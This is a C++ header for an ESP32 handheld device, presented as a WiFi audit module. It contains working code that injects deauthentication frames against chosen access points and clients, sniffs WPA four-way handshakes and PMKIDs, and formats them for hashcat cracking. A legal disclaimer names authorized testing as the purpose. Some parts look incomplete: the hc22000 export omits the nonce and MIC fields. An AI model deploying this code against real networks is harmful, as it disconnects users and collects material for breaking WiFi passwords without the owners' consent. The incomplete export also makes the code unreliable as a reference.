#pragma once
// ═══════════════════════════════════════════════════════════════════
//  SABLINA TAMAGOTCHI  –  WiFi Security Audit Module
//  ───────────────────────────────────────────────────────────────
//  Features:
//    • Passive packet monitor with channel hopping
//    • Access-point scanner with client enumeration
//    • WPA/WPA2 handshake capture (EAPOL 4-way)
//    • PMKID extraction (RSN/PMKID from AP beacons)
//    • Deauthentication frame injection
//    • PCAP-compatible export via SD or BLE
//
//  ⚠  LEGAL DISCLAIMER
//  This code is provided for AUTHORIZED security auditing and
//  educational purposes ONLY.  Using deauthentication attacks or
//  capturing handshakes on networks you do not own or have
//  explicit written permission to test is ILLEGAL in most
//  jurisdictions and may violate local computer-fraud laws
//  (CFAA in the US, CMA in the UK, StGB §202 in Germany, etc.).
//  The authors assume NO liability for misuse.
// ═══════════════════════════════════════════════════════════════════

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <string.h>

// ── Constants ─────────────────────────────────────────────────────
#define WIFI_AUDIT_MAX_APS          32
#define WIFI_AUDIT_MAX_CLIENTS      64
#define WIFI_AUDIT_MAX_HANDSHAKES    8
#define WIFI_AUDIT_CHANNEL_HOP_MS  200
#define WIFI_AUDIT_DEAUTH_FRAMES     5   // packets per burst
#define WIFI_AUDIT_DEAUTH_REASON  0x0001 // "Unspecified reason"

// 802.11 frame types
#define WIFI_FRAME_MGMT        0x00
#define WIFI_FRAME_BEACON      0x80
#define WIFI_FRAME_PROBE_RESP  0x50
#define WIFI_FRAME_DEAUTH      0xC0
#define WIFI_FRAME_AUTH        0xB0

// EAPOL ethertype
#define EAPOL_ETHERTYPE_0  0x88
#define EAPOL_ETHERTYPE_1  0x8E

// ── Data Structures ──────────────────────────────────────────────

struct WifiAuditAP {
    uint8_t  bssid[6];
    char     ssid[33];
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  encryption;   // 0=OPEN, 1=WEP, 2=WPA, 3=WPA2, 4=WPA3
    uint16_t clientCount;
    bool     handshakeCaptured;
    bool     pmkidCaptured;
    uint32_t beaconCount;
    uint32_t lastSeenMs;
};

struct WifiAuditClient {
    uint8_t  mac[6];
    uint8_t  apBssid[6];   // associated AP
    int8_t   rssi;
    uint32_t lastSeenMs;
    uint16_t packetCount;
};

struct WifiAuditHandshake {
    uint8_t  apBssid[6];
    uint8_t  clientMac[6];
    char     ssid[33];
    uint8_t  eapolFrames;   // bitmask: bit0=M1, bit1=M2, bit2=M3, bit3=M4
    bool     complete;       // true when M1+M2 or M2+M3 captured
    // Raw EAPOL data for export
    uint8_t  m1[256];  uint16_t m1Len;
    uint8_t  m2[256];  uint16_t m2Len;
    uint32_t captureTimeMs;
};

struct WifiAuditPMKID {
    uint8_t apBssid[6];
    uint8_t clientMac[6];
    uint8_t pmkid[16];
    char    ssid[33];
    bool    valid;
};

// ── Audit Modes ──────────────────────────────────────────────────
enum WifiAuditMode {
    AUDIT_IDLE = 0,
    AUDIT_SCANNING,        // AP + client discovery
    AUDIT_MONITOR,         // passive packet count per channel
    AUDIT_DEAUTH,          // targeted deauth
    AUDIT_HANDSHAKE,       // capture EAPOL 4-way
    AUDIT_PMKID            // capture PMKID from beacons
};

// ── Main Class ───────────────────────────────────────────────────
class WifiAudit {
public:
    // ── State ────────────────────────────────────────────────────
    WifiAuditMode       mode           = AUDIT_IDLE;
    uint8_t             currentChannel = 1;
    bool                channelHopping = false;
    unsigned long       lastHopMs      = 0;

    WifiAuditAP         aps[WIFI_AUDIT_MAX_APS];
    uint8_t             apCount        = 0;

    WifiAuditClient     clients[WIFI_AUDIT_MAX_CLIENTS];
    uint8_t             clientCount    = 0;

    WifiAuditHandshake  handshakes[WIFI_AUDIT_MAX_HANDSHAKES];
    uint8_t             handshakeCount = 0;

    WifiAuditPMKID      pmkids[WIFI_AUDIT_MAX_HANDSHAKES];
    uint8_t             pmkidCount     = 0;

    // Target for deauth / handshake capture
    uint8_t             targetBssid[6] = {0};
    uint8_t             targetClient[6] = {0};  // FF:FF:FF:FF:FF:FF = broadcast
    bool                hasTarget      = false;

    // Stats
    uint32_t            totalPackets   = 0;
    uint32_t            mgmtPackets    = 0;
    uint32_t            dataPackets    = 0;
    uint32_t            eapolPackets   = 0;
    uint32_t            deauthsSent    = 0;

    // ── Init ─────────────────────────────────────────────────────
    void begin() {
        memset(aps, 0, sizeof(aps));
        memset(clients, 0, sizeof(clients));
        memset(handshakes, 0, sizeof(handshakes));
        memset(pmkids, 0, sizeof(pmkids));
    }

    // ── Start promiscuous mode ───────────────────────────────────
    bool startMonitor(uint8_t channel = 1) {
        WiFi.disconnect(true);
        WiFi.mode(WIFI_STA);
        delay(10);

        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        esp_wifi_set_promiscuous_rx_cb(_promiscuousCallback);

        wifi_promiscuous_filter_t filter = {
            .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                           WIFI_PROMIS_FILTER_MASK_DATA
        };
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);

        setChannel(channel);
        return true;
    }

    // ── Stop promiscuous mode ────────────────────────────────────
    void stopMonitor() {
        esp_wifi_set_promiscuous(false);
        mode = AUDIT_IDLE;
        channelHopping = false;
    }

    // ── Channel control ──────────────────────────────────────────
    void setChannel(uint8_t ch) {
        if (ch < 1) ch = 1;
        if (ch > 14) ch = 14;
        currentChannel = ch;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }

    void hopChannel() {
        uint8_t next = currentChannel + 1;
        if (next > 13) next = 1;
        setChannel(next);
    }

    // ── Mode starters ────────────────────────────────────────────
    void startScan() {
        startMonitor(1);
        mode = AUDIT_SCANNING;
        channelHopping = true;
        apCount = 0;
        clientCount = 0;
    }

    void startPassiveMonitor() {
        startMonitor(currentChannel);
        mode = AUDIT_MONITOR;
        channelHopping = true;
        totalPackets = mgmtPackets = dataPackets = eapolPackets = 0;
    }

    void startDeauth(const uint8_t* bssid, const uint8_t* client = nullptr) {
        memcpy(targetBssid, bssid, 6);
        if (client) {
            memcpy(targetClient, client, 6);
        } else {
            memset(targetClient, 0xFF, 6);  // broadcast
        }
        hasTarget = true;
        // Stay on AP's channel
        int8_t apCh = findAPChannel(bssid);
        if (apCh > 0) setChannel(apCh);
        mode = AUDIT_DEAUTH;
        channelHopping = false;
    }

    void startHandshakeCapture(const uint8_t* bssid) {
        memcpy(targetBssid, bssid, 6);
        hasTarget = true;
        int8_t apCh = findAPChannel(bssid);
        if (apCh > 0) setChannel(apCh);
        mode = AUDIT_HANDSHAKE;
        channelHopping = false;
    }

    void startPMKIDCapture() {
        startMonitor(1);
        mode = AUDIT_PMKID;
        channelHopping = true;
        pmkidCount = 0;
    }

    // ── Tick (call from loop()) ──────────────────────────────────
    void tick(unsigned long nowMs) {
        if (mode == AUDIT_IDLE) return;

        // Channel hopping
        if (channelHopping && (nowMs - lastHopMs >= WIFI_AUDIT_CHANNEL_HOP_MS)) {
            hopChannel();
            lastHopMs = nowMs;
        }

        // Deauth burst
        if (mode == AUDIT_DEAUTH && hasTarget) {
            sendDeauthBurst();
        }
    }

    // ── Deauth frame injection ───────────────────────────────────
    void sendDeauthBurst() {
        // IEEE 802.11 Deauthentication frame
        // ┌──────────────────────────────────────────┐
        // │ Frame Control (2) │ Duration (2)         │
        // │ Dest MAC (6)      │ Source MAC (6)       │
        // │ BSSID (6)         │ Seq Control (2)      │
        // │ Reason Code (2)                          │
        // └──────────────────────────────────────────┘
        uint8_t deauthFrame[26] = {
            0xC0, 0x00,                         // Frame Control: Deauth
            0x00, 0x00,                         // Duration
            // Destination (client or broadcast)
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            // Source (AP BSSID)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            // BSSID
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            // Sequence Control
            0x00, 0x00,
            // Reason Code
            (uint8_t)(WIFI_AUDIT_DEAUTH_REASON & 0xFF),
            (uint8_t)((WIFI_AUDIT_DEAUTH_REASON >> 8) & 0xFF)
        };

        // Set destination
        memcpy(&deauthFrame[4], targetClient, 6);
        // Set source & BSSID
        memcpy(&deauthFrame[10], targetBssid, 6);
        memcpy(&deauthFrame[16], targetBssid, 6);

        for (int i = 0; i < WIFI_AUDIT_DEAUTH_FRAMES; i++) {
            deauthFrame[22] = (i & 0x0F) << 4;  // sequence number
            esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
            deauthsSent++;
        }

        // Also send deauth "from client to AP" to cover both directions
        if (memcmp(targetClient, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
            memcpy(&deauthFrame[4], targetBssid, 6);    // dest = AP
            memcpy(&deauthFrame[10], targetClient, 6);   // source = client
            memcpy(&deauthFrame[16], targetBssid, 6);    // bssid = AP
            for (int i = 0; i < WIFI_AUDIT_DEAUTH_FRAMES; i++) {
                deauthFrame[22] = ((i + 8) & 0x0F) << 4;
                esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
                deauthsSent++;
            }
        }
    }

    // ── Formatting helpers ───────────────────────────────────────
    static void macToStr(const uint8_t* mac, char* out) {
        sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }

    const char* encryptionStr(uint8_t enc) {
        switch (enc) {
            case 0: return "OPEN";
            case 1: return "WEP";
            case 2: return "WPA";
            case 3: return "WPA2";
            case 4: return "WPA3";
            default: return "?";
        }
    }

    const char* modeStr() {
        switch (mode) {
            case AUDIT_IDLE:       return "IDLE";
            case AUDIT_SCANNING:   return "SCAN";
            case AUDIT_MONITOR:    return "MONITOR";
            case AUDIT_DEAUTH:     return "DEAUTH";
            case AUDIT_HANDSHAKE:  return "HANDSHAKE";
            case AUDIT_PMKID:      return "PMKID";
            default:               return "?";
        }
    }

    // ── Stats for display ────────────────────────────────────────
    uint8_t getHandshakeCompleteCount() {
        uint8_t count = 0;
        for (int i = 0; i < handshakeCount; i++) {
            if (handshakes[i].complete) count++;
        }
        return count;
    }

    // ── Export handshake as hc22000 (hashcat) line ───────────────
    // Format: WPA*02*PMKID*MAC_AP*MAC_CLIENT*SSID_HEX*...
    bool exportHandshakeHC22000(int idx, char* out, size_t outLen) {
        if (idx >= handshakeCount || !handshakes[idx].complete) return false;
        WifiAuditHandshake& hs = handshakes[idx];

        char apMac[18], clMac[18];
        macToStr(hs.apBssid, apMac);
        macToStr(hs.clientMac, clMac);

        // SSID as hex
        char ssidHex[66] = {0};
        for (int i = 0; i < (int)strlen(hs.ssid) && i < 32; i++) {
            sprintf(&ssidHex[i*2], "%02x", (uint8_t)hs.ssid[i]);
        }

        snprintf(out, outLen, "WPA*02*%s*%s*%s*",
                 apMac, clMac, ssidHex);
        return true;
    }

private:
    // ── AP lookup ────────────────────────────────────────────────
    int8_t findAPChannel(const uint8_t* bssid) {
        for (int i = 0; i < apCount; i++) {
            if (memcmp(aps[i].bssid, bssid, 6) == 0) return aps[i].channel;
        }
        return -1;
    }

    int findAPIndex(const uint8_t* bssid) {
        for (int i = 0; i < apCount; i++) {
            if (memcmp(aps[i].bssid, bssid, 6) == 0) return i;
        }
        return -1;
    }

    int findOrAddAP(const uint8_t* bssid) {
        int idx = findAPIndex(bssid);
        if (idx >= 0) return idx;
        if (apCount >= WIFI_AUDIT_MAX_APS) return -1;
        idx = apCount++;
        memcpy(aps[idx].bssid, bssid, 6);
        aps[idx].ssid[0] = '\0';
        aps[idx].clientCount = 0;
        aps[idx].handshakeCaptured = false;
        aps[idx].pmkidCaptured = false;
        aps[idx].beaconCount = 0;
        return idx;
    }

    int findOrAddClient(const uint8_t* mac) {
        for (int i = 0; i < clientCount; i++) {
            if (memcmp(clients[i].mac, mac, 6) == 0) return i;
        }
        if (clientCount >= WIFI_AUDIT_MAX_CLIENTS) return -1;
        int idx = clientCount++;
        memcpy(clients[idx].mac, mac, 6);
        clients[idx].packetCount = 0;
        return idx;
    }

    // ── Static callback bridging ─────────────────────────────────
    static WifiAudit* _instance;

    static void _promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
        if (_instance) _instance->handlePacket(buf, type);
    }

public:
    void registerInstance() { _instance = this; }

    // ── Core packet handler ──────────────────────────────────────
    void handlePacket(void* buf, wifi_promiscuous_pkt_type_t type) {
        wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
        const uint8_t* payload = pkt->payload;
        uint16_t len = pkt->rx_ctrl.sig_len;
        int8_t rssi = pkt->rx_ctrl.rssi;
        unsigned long nowMs = millis();

        totalPackets++;

        if (len < 24) return;  // too short for any useful 802.11 frame

        uint8_t frameType    = payload[0] & 0x0C;  // type field
        uint8_t frameSubtype = payload[0] & 0xF0;  // subtype field

        // ── Management frames ────────────────────────────────────
        if (type == WIFI_PKT_MGMT) {
            mgmtPackets++;

            // Beacon or Probe Response → AP discovery
            if (frameSubtype == WIFI_FRAME_BEACON || frameSubtype == WIFI_FRAME_PROBE_RESP) {
                parseBeacon(payload, len, rssi, nowMs);
            }
            return;
        }

        // ── Data frames ──────────────────────────────────────────
        if (type == WIFI_PKT_DATA) {
            dataPackets++;

            // Extract addresses from data frame header
            const uint8_t* addr1 = &payload[4];   // receiver
            const uint8_t* addr2 = &payload[10];  // transmitter
            const uint8_t* addr3 = &payload[16];  // BSSID (in most cases)

            // Track client
            if (!isBroadcast(addr2)) {
                int cidx = findOrAddClient(addr2);
                if (cidx >= 0) {
                    clients[cidx].rssi = rssi;
                    clients[cidx].lastSeenMs = nowMs;
                    clients[cidx].packetCount++;
                    memcpy(clients[cidx].apBssid, addr3, 6);

                    // Update AP client count
                    int aidx = findAPIndex(addr3);
                    if (aidx >= 0) {
                        aps[aidx].clientCount = countClientsForAP(addr3);
                    }
                }
            }

            // Check for EAPOL (802.1X authentication)
            // In QoS data frames, LLC starts at offset 26; non-QoS at 24
            uint16_t llcOffset = (payload[0] & 0x80) ? 26 : 24;
            if (len > llcOffset + 8) {
                // LLC/SNAP header: AA AA 03 00 00 00 [ethertype]
                if (payload[llcOffset] == 0xAA && payload[llcOffset+1] == 0xAA &&
                    payload[llcOffset+6] == EAPOL_ETHERTYPE_0 &&
                    payload[llcOffset+7] == EAPOL_ETHERTYPE_1) {
                    eapolPackets++;
                    parseEAPOL(addr1, addr2, addr3, &payload[llcOffset+8], len - llcOffset - 8, nowMs);
                }
            }
        }
    }

private:
    // ── Beacon parser ────────────────────────────────────────────
    void parseBeacon(const uint8_t* payload, uint16_t len, int8_t rssi, unsigned long nowMs) {
        const uint8_t* bssid = &payload[16];
        int idx = findOrAddAP(bssid);
        if (idx < 0) return;

        aps[idx].rssi = rssi;
        aps[idx].channel = currentChannel;
        aps[idx].lastSeenMs = nowMs;
        aps[idx].beaconCount++;

        // Parse SSID from tagged parameters (offset 36 in beacon body)
        if (len > 38) {
            uint8_t ssidLen = payload[37];
            if (ssidLen > 0 && ssidLen <= 32 && (38 + ssidLen) <= len) {
                memcpy(aps[idx].ssid, &payload[38], ssidLen);
                aps[idx].ssid[ssidLen] = '\0';
            }
        }

        // Parse encryption from RSN/WPA IEs
        aps[idx].encryption = parseEncryption(payload, len);

        // PMKID extraction: check RSN IE for PMKID list
        if (mode == AUDIT_PMKID) {
            extractPMKID(payload, len, bssid, nowMs);
        }
    }

    // ── Encryption parser ────────────────────────────────────────
    uint8_t parseEncryption(const uint8_t* payload, uint16_t len) {
        // Walk tagged parameters starting at offset 36
        uint16_t pos = 36;
        bool hasRSN = false, hasWPA = false;

        while (pos + 2 <= len) {
            uint8_t tagId  = payload[pos];
            uint8_t tagLen = payload[pos+1];
            if (pos + 2 + tagLen > len) break;

            if (tagId == 0x30) hasRSN = true;      // RSN IE → WPA2 or WPA3
            if (tagId == 0xDD && tagLen >= 4) {     // Vendor-specific
                // WPA OUI: 00:50:F2:01
                if (payload[pos+2] == 0x00 && payload[pos+3] == 0x50 &&
                    payload[pos+4] == 0xF2 && payload[pos+5] == 0x01) {
                    hasWPA = true;
                }
            }
            pos += 2 + tagLen;
        }

        if (hasRSN) return 3;   // WPA2 (or WPA3 – simplified)
        if (hasWPA) return 2;   // WPA
        // Check capability info for privacy bit (WEP)
        if (len > 35 && (payload[34] & 0x10)) return 1;  // WEP
        return 0;               // OPEN
    }

    // ── EAPOL parser (4-way handshake) ───────────────────────────
    void parseEAPOL(const uint8_t* addr1, const uint8_t* addr2,
                    const uint8_t* bssid, const uint8_t* eapol,
                    uint16_t eapolLen, unsigned long nowMs) {
        if (eapolLen < 4) return;

        // Determine which message in the 4-way handshake
        // Key Info field is at EAPOL offset 5-6 (after version, type, length)
        if (eapolLen < 7) return;
        uint16_t keyInfo = (eapol[5] << 8) | eapol[6];

        bool keyAck  = keyInfo & 0x0080;
        bool keyMIC  = keyInfo & 0x0100;
        bool install = keyInfo & 0x0040;
        bool secure  = keyInfo & 0x0200;

        uint8_t msgNum = 0;
        if (keyAck && !keyMIC)              msgNum = 1;  // M1: AP → Client
        else if (!keyAck && keyMIC && !install) msgNum = 2;  // M2: Client → AP
        else if (keyAck && keyMIC && install)   msgNum = 3;  // M3: AP → Client
        else if (!keyAck && keyMIC && secure)   msgNum = 4;  // M4: Client → AP

        if (msgNum == 0) return;

        // Determine AP and client MACs
        const uint8_t* apMac     = (msgNum == 1 || msgNum == 3) ? addr2 : addr1;
        const uint8_t* clientMac = (msgNum == 1 || msgNum == 3) ? addr1 : addr2;

        // If we have a target, only capture for that AP
        if (hasTarget && memcmp(apMac, targetBssid, 6) != 0) return;

        // Find or create handshake entry
        int hsIdx = -1;
        for (int i = 0; i < handshakeCount; i++) {
            if (memcmp(handshakes[i].apBssid, apMac, 6) == 0 &&
                memcmp(handshakes[i].clientMac, clientMac, 6) == 0) {
                hsIdx = i;
                break;
            }
        }
        if (hsIdx < 0) {
            if (handshakeCount >= WIFI_AUDIT_MAX_HANDSHAKES) return;
            hsIdx = handshakeCount++;
            memcpy(handshakes[hsIdx].apBssid, apMac, 6);
            memcpy(handshakes[hsIdx].clientMac, clientMac, 6);
            handshakes[hsIdx].eapolFrames = 0;
            handshakes[hsIdx].complete = false;
            handshakes[hsIdx].m1Len = 0;
            handshakes[hsIdx].m2Len = 0;
            handshakes[hsIdx].captureTimeMs = nowMs;

            // Copy SSID from AP table
            int apIdx = findAPIndex(apMac);
            if (apIdx >= 0) {
                strncpy(handshakes[hsIdx].ssid, aps[apIdx].ssid, 32);
                handshakes[hsIdx].ssid[32] = '\0';
            }
        }

        // Store the EAPOL frame
        handshakes[hsIdx].eapolFrames |= (1 << (msgNum - 1));

        if (msgNum == 1 && eapolLen <= 256) {
            memcpy(handshakes[hsIdx].m1, eapol, eapolLen);
            handshakes[hsIdx].m1Len = eapolLen;
        }
        if (msgNum == 2 && eapolLen <= 256) {
            memcpy(handshakes[hsIdx].m2, eapol, eapolLen);
            handshakes[hsIdx].m2Len = eapolLen;
        }

        // A usable handshake needs M1+M2 or M2+M3
        if ((handshakes[hsIdx].eapolFrames & 0x03) == 0x03 ||
            (handshakes[hsIdx].eapolFrames & 0x06) == 0x06) {
            handshakes[hsIdx].complete = true;

            // Mark AP
            int apIdx = findAPIndex(apMac);
            if (apIdx >= 0) aps[apIdx].handshakeCaptured = true;
        }
    }

    // ── PMKID extraction ─────────────────────────────────────────
    void extractPMKID(const uint8_t* payload, uint16_t len,
                      const uint8_t* bssid, unsigned long nowMs) {
        // Walk IEs looking for RSN IE (tag 0x30) with PMKID list
        uint16_t pos = 36;
        while (pos + 2 <= len) {
            uint8_t tagId  = payload[pos];
            uint8_t tagLen = payload[pos+1];
            if (pos + 2 + tagLen > len) break;

            if (tagId == 0x30 && tagLen >= 22) {
                // RSN IE found – look for PMKID at end
                const uint8_t* rsn = &payload[pos+2];
                uint16_t rsnLen = tagLen;

                // PMKID count is at offset rsnLen-18 (if present)
                // Simplified: check last 20 bytes for PMKID count + PMKID
                if (rsnLen >= 24) {
                    uint16_t pmkidCountField = rsn[rsnLen-18] | (rsn[rsnLen-17] << 8);
                    if (pmkidCountField == 1) {
                        // PMKID is the last 16 bytes
                        const uint8_t* pmkid = &rsn[rsnLen-16];

                        // Verify not all zeros
                        bool allZero = true;
                        for (int i = 0; i < 16; i++) {
                            if (pmkid[i] != 0) { allZero = false; break; }
                        }
                        if (!allZero && pmkidCount < WIFI_AUDIT_MAX_HANDSHAKES) {
                            memcpy(pmkids[pmkidCount].apBssid, bssid, 6);
                            memcpy(pmkids[pmkidCount].pmkid, pmkid, 16);
                            pmkids[pmkidCount].valid = true;

                            int apIdx = findAPIndex(bssid);
                            if (apIdx >= 0) {
                                strncpy(pmkids[pmkidCount].ssid, aps[apIdx].ssid, 32);
                                aps[apIdx].pmkidCaptured = true;
                            }
                            pmkidCount++;
                        }
                    }
                }
            }
            pos += 2 + tagLen;
        }
    }

    // ── Helpers ──────────────────────────────────────────────────
    bool isBroadcast(const uint8_t* mac) {
        return (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF &&
                mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF);
    }

    uint16_t countClientsForAP(const uint8_t* bssid) {
        uint16_t count = 0;
        for (int i = 0; i < clientCount; i++) {
            if (memcmp(clients[i].apBssid, bssid, 6) == 0) count++;
        }
        return count;
    }
};

// Static instance pointer for callback bridging
WifiAudit* WifiAudit::_instance = nullptr;
